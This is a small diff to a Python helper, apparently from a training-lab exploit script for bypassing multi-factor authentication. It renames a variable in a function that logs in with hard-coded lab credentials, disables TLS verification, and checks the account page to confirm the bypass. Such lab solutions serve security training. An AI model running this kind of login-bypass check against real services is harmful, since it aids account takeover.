@@ -15,18 +15,18 @@ def is_mfa_bypassed(url, session):
     login_data = {
         "username": "carlos", 
         "password": "montoya"}
-    request = session.post(
+    response = session.post(
         login_url,
         data=login_data,
         allow_redirects=False,
         verify=False,
         proxies=proxies)
     myaccount_url = url + "/my-account"
-    request = session.get(
+    response = session.get(
         myaccount_url,
         verify=False,
         proxies=proxies)
-    return "Log out" in request.text
+    return "Log out" in response.text
 
 if __name__ == "__main__":
     try:
